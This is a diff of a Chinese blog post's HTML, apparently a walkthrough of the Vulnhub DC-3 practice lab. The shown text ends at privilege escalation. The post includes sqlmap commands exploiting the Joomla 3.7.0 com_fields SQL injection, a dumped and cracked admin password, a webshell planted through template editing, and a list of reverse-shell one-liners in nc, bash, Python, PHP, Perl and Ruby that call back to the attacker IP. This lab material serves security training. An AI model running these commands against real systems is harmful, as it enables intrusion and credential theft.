@@ -1,17 +1,17 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulnhub-DC-3渗透学习 | 风清竹喧</title><meta name="keywords" content="渗透测试,靶机,web"><meta name="author" content="cgrona"><meta name="copyright" content="cgrona"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、环境搭建  攻击机：Kali-2021.3：192.168.8.105 靶机：Vulnhub-DC-3：192.168.8.180  二、信息收集 主机探活 1nmap -sP 192.168.8.0&#x2F;24  找到目标IP后继续扫描其开放端口 1namp -A -p- 192.168.8.180  看到它只开放了80端口，同时也扫描到了网站的CMS 或者我们也可以用w">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulnhub-DC-3渗透学习 | 风清竹喧</title><meta name="keywords" content="web,渗透测试,靶机"><meta name="author" content="cgrona"><meta name="copyright" content="cgrona"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、环境搭建  攻击机：Kali-2021.3：192.168.8.105 靶机：Vulnhub-DC-3：192.168.8.180  二、信息收集 主机探活 1nmap -sP 192.168.8.0&#x2F;24  找到目标IP后继续扫描其开放端口 1namp -A -p- 192.168.8.180  看到它只开放了80端口，同时也扫描到了网站的CMS 或者我们也可以用whatweb来扫描网站信息">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Vulnhub-DC-3渗透学习">
 <meta property="og:url" content="https://cgrona.top/2022/06/11/Vulnhub-DC-3/index.html">
 <meta property="og:site_name" content="风清竹喧">
-<meta property="og:description" content="一、环境搭建  攻击机：Kali-2021.3：192.168.8.105 靶机：Vulnhub-DC-3：192.168.8.180  二、信息收集 主机探活 1nmap -sP 192.168.8.0&#x2F;24  找到目标IP后继续扫描其开放端口 1namp -A -p- 192.168.8.180  看到它只开放了80端口，同时也扫描到了网站的CMS 或者我们也可以用w">
+<meta property="og:description" content="一、环境搭建  攻击机：Kali-2021.3：192.168.8.105 靶机：Vulnhub-DC-3：192.168.8.180  二、信息收集 主机探活 1nmap -sP 192.168.8.0&#x2F;24  找到目标IP后继续扫描其开放端口 1namp -A -p- 192.168.8.180  看到它只开放了80端口，同时也扫描到了网站的CMS 或者我们也可以用whatweb来扫描网站信息">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img.cgrona.top/Blog_img/26.jpg">
 <meta property="article:published_time" content="2022-06-11T07:26:50.000Z">
 <meta property="article:modified_time" content="2022-08-14T04:31:01.653Z">
 <meta property="article:author" content="cgrona">
+<meta property="article:tag" content="web">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="靶机">
-<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img.cgrona.top/Blog_img/26.jpg"><link rel="shortcut icon" href="/img/logo.jpg"><link rel="canonical" href="https://cgrona.top/2022/06/11/Vulnhub-DC-3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
   root: '/',
@@ -145,131 +145,153 @@
     }
     detectApple()
     })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="风清竹喧" type="application/atom+xml">
-</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.cgrona.top/Blog_img/26.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">风清竹喧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub-DC-3渗透学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-11T07:26:50.000Z" title="发表于 2022-06-11 15:26:50">2022-06-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-14T04:31:01.653Z" title="更新于 2022-08-14 12:31:01">2022-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA-%E9%9D%B6%E6%9C%BA/">靶场&amp;靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub-DC-3渗透学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一环境搭建">一、环境搭建</h1>
+<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.cgrona.top/Blog_img/26.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">风清竹喧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub-DC-3渗透学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-11T07:26:50.000Z" title="发表于 2022-06-11 15:26:50">2022-06-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-14T04:31:01.653Z" title="更新于 2022-08-14 12:31:01">2022-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA-%E9%9D%B6%E6%9C%BA/">靶场&amp;靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub-DC-3渗透学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>一、环境搭建</h1>
 <blockquote>
 <p>攻击机：Kali-2021.3：192.168.8.105</p>
 <p>靶机：Vulnhub-DC-3：192.168.8.180</p>
 </blockquote>
-<h1 id="二信息收集">二、信息收集</h1>
+<h1>二、信息收集</h1>
 <p>主机探活</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/1.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/1.png" alt></p>
 <p>找到目标IP后继续扫描其开放端口</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -A -p- 192.168.8.180</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/2.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/2.png" alt></p>
 <p>看到它只开放了80端口，同时也扫描到了网站的CMS</p>
 <p>或者我们也可以用whatweb来扫描网站信息</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.8.180:80</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/3.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/3.png" alt></p>
 <p>再或者我们可以先访问IP的80端口，利用Firefox的插件来找出网站的相关信息</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/4.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/4.png" alt></p>
 <p>在网站首页有与一段文字，翻译一下，意思是只有一个flag，只有获得root权限才能找到</p>
 <blockquote>
-<p>欢迎来到 DC-3。 这一次，只有一个flag，一个入口，没有任何线索。
-要获得flag，您显然必须获得 root 权限。 如何成为 root 取决于您 -
-显然，取决于系统。 祝你好运 - 我希望你喜欢这个小挑战。 :-)</p>
+<p>欢迎来到 DC-3。 这一次，只有一个flag，一个入口，没有任何线索。 要获得flag，您显然必须获得 root 权限。 如何成为 root 取决于您 - 显然，取决于系统。 祝你好运 - 我希望你喜欢这个小挑战。 :-)</p>
 </blockquote>
-<h1 id="三实战">三、实战</h1>
-<h2 id="漏洞分析">1、漏洞分析</h2>
+<h1>三、实战</h1>
+<h2 id="1-漏洞分析">1、漏洞分析</h2>
 <p>首先我们知道它的CMS是<code>Joomla</code>，所以我们就使用专门的扫描工具来对其扫描</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan --url http://192.168.8.180</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/5.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/5.png" alt></p>
 <p>可以看到它扫出了网站的CMS版本信息以及网站的管理员登录入口</p>
 <p>访问一下</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/6.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/6.png" alt></p>
 <p>现在我们知道了CMS版本信息，那么就来看看这个版本是否有漏洞吧</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/7.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/7.png" alt></p>
 <p>可以看到找到了一个SQL注入的漏洞，查看一下漏洞信息</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/8.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/8.png" alt></p>
 <p>可以看到里面给出了payload，告诉我们使用sqlmap就可以了</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/9.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/9.png" alt></p>
 <p>发现了五个数据库，很明显第二个数据库是我们的目标</p>
-<ol type="1">
-<li><p>查找数据库<code>joomladb</code>的所有表</p>
+<ol>
+<li>
+<p>查找数据库<code>joomladb</code>的所有表</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/10.png"></p></li>
-<li><p>查看表<code>#__users</code>的内容</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/10.png" alt></p>
+</li>
+<li>
+<p>查看表<code>#__users</code>的内容</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/11.png"></p></li>
-<li><p>查询字段<code>username</code>、<code>password</code>的内容</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/11.png" alt></p>
+</li>
+<li>
+<p>查询字段<code>username</code>、<code>password</code>的内容</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump -p list[fullordering]</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/12.png"></p>
-<p>成功找到管理员账户密码</p></li>
+<p><img src="/2022/06/11/Vulnhub-DC-3/12.png" alt></p>
+<p>成功找到管理员账户密码</p>
+</li>
 </ol>
 <p>但这个密码是经过了<code>hash</code>加密，因此我们使用john爆破一下，把密码保存到文件里</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27; &gt; 1.txt</span><br><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/13.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/13.png" alt></p>
 <p>因为我之前已经爆破过了，第二次爆破<code>john</code>不会显示出结果，要想显示出结果，就使用</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -show 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/14.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/14.png" alt></p>
 <p>成功得到账号/密码</p>
 <blockquote>
 <p>admin</p>
 <p>snoopy</p>
 </blockquote>
-<h2 id="登录后台">2、登录后台</h2>
-<p><img src="/2022/06/11/Vulnhub-DC-3/15.png"></p>
+<h2 id="2-登录后台">2、登录后台</h2>
+<p><img src="/2022/06/11/Vulnhub-DC-3/15.png" alt></p>
 <p>然后就是寻找寻找有没有文件上传点、文件包含点之类的来拿到webshell</p>
 <p>寻找一段时间后发现在<code>Extensions-Templates-Templates</code>里可以新建并上传文件</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/16.png"></p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/17.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/16.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/17.png" alt></p>
 <p>新建一个php文件，然后写入一句话木马</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/18.png"></p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/19.png"></p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/20.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/18.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/19.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/20.png" alt></p>
 <p>保存上传后，接下来就是找到这个文件的路径</p>
 <p>根据这句话大概能猜到这个文件所在的路径，也可以网上找找资料</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/21.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/21.png" alt></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.180/templates/beez3/html/shell.php</span><br></pre></td></tr></table></figure>
-<h2 id="getshell并反弹shell">3、getshell并反弹shell</h2>
+<h2 id="3-getshell并反弹shell">3、getshell并反弹shell</h2>
 <p>蚁剑连接</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/22.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/22.png" alt></p>
 <p>成功得到shell，然后开始反弹shell，反弹shell可以方便我们后面的提权</p>
 <p>kali开启监听</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/23.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/23.png" alt></p>
 <p>接下来就是反弹shell了</p>
 <p>总结一下常见的反弹shell的方法：</p>
-<ol type="1">
-<li><p><strong>利用netcat反弹shell</strong></p>
+<ol>
+<li>
+<p><strong>利用netcat反弹shell</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.8.105 2222 -e /bin/bash</span><br></pre></td></tr></table></figure>
 <p>如果<code>nc</code>无法使用<code>-e</code>参数时使用</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure></li>
-<li><p><strong>利用Bash反弹shell</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></li>
-<li><p><strong>各种脚本反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>利用Bash反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>各种脚本反弹shell</strong></p>
 <ul>
-<li><p><code>Python</code> 脚本反弹shell（当目标主机上有Python环境）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.105&quot;,2222	));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p><code>php</code>脚本反弹shell（当目标主机上有php环境）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.8.105&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p><code>Perl</code>脚本反弹shell（当目标主机上有Perl环境）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.8.105&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p><code>Ruby</code>脚本反弹shell（当目标主机上有Ruby环境）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.8.105&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure></li>
-</ul></li>
+<li>
+<p><code>Python</code> 脚本反弹shell（当目标主机上有Python环境）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.105&quot;,2222	));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>php</code>脚本反弹shell（当目标主机上有php环境）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.8.105&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>Perl</code>脚本反弹shell（当目标主机上有Perl环境）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.8.105&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>Ruby</code>脚本反弹shell（当目标主机上有Ruby环境）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.8.105&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
 </ol>
 <p>因此这里我们尝试使用<code>nc</code>进行反弹</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/24.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/24.png" alt></p>
 <p>但是发现目标主机上的<code>nc</code>无法使用<code>-e</code>参数</p>
 <p>因此这个方法行不通，那就使用这个来进行反弹</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/25.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/25.png" alt></p>
 <p>成功反弹</p>
-<h2 id="提权">4、提权</h2>
+<h2 id="4-提权">4、提权</h2>
 <p>先来尝试一下能不能SUID提权以及有没有可以使用的免密的root权限的文件</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/26.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/26.png" alt></p>
 <p>发现并不存在我们可以很好利用的文件</p>
 <p>那就收集一下目标主机的一些信息吧</p>
-<ol type="1">
-<li><p>查看操作系统的版本信息</p>
